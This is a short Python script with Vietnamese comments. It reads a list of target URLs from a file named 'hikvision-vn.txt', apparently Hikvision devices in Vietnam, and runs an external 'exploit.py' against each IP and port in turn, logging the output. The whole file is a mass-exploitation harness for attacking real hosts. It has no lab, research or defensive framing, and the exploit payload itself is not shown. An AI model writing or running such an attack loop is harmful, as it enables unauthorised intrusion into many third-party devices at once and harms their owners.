import re
import subprocess
import os
import logging

# Cấu hình logging
logging.basicConfig(filename='debug.log', level=logging.DEBUG,
                    format='%(asctime)s - %(levelname)s - %(message)s')

def trich_xuat_urls(tentaptin):
    urls = []
    try:
        with open(tentaptin, 'r') as file:
            for line in file:
                line = line.strip()
                # Phan tich URL de lay IP, port va SSL
                match = re.match(r"(http[s]?://)([\d\.]+)(:(\d+))?(/.*)", line)
                if match:
                    protocol = match.group(1)
                    ip = match.group(2)
                    port = match.group(4) if match.group(4) else (443 if protocol == 'https://' else 80)
                    ssl = 'Y' if protocol == 'https://' else 'N'
                    urls.append((ip, port, ssl))
                    logging.debug(f"Trich xuat URL: IP={ip}, Port={port}, SSL={ssl}")
                else:
                    logging.warning(f"Khong the phan tich URL: {line}")
    except Exception as e:
        logging.error(f"Loi khi doc file {tentaptin}: {e}")
    return urls

def chay_exploit(ip, port, ssl):
    try:
        logging.info(f"Chay exploit cho IP: {ip}, Port: {port}, SSL: {ssl}")
        result = subprocess.run(['python3', 'exploit.py', ip, str(port), ssl], 
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
                                universal_newlines=True)
        logging.debug(f"Ket qua stdout: {result.stdout}")
        if result.stderr:
            logging.error(f"Ket qua stderr: {result.stderr}")
    except Exception as e:
        logging.error(f"Loi khi chay exploit cho IP: {ip}, Port: {port}, SSL: {ssl}. Loi: {e}")

def main():
    tentaptin = 'hikvision-vn.txt'
    urls = trich_xuat_urls(tentaptin)
    
    for ip, port, ssl in urls:
        chay_exploit(ip, port, ssl)

if __name__ == "__main__":
    main()
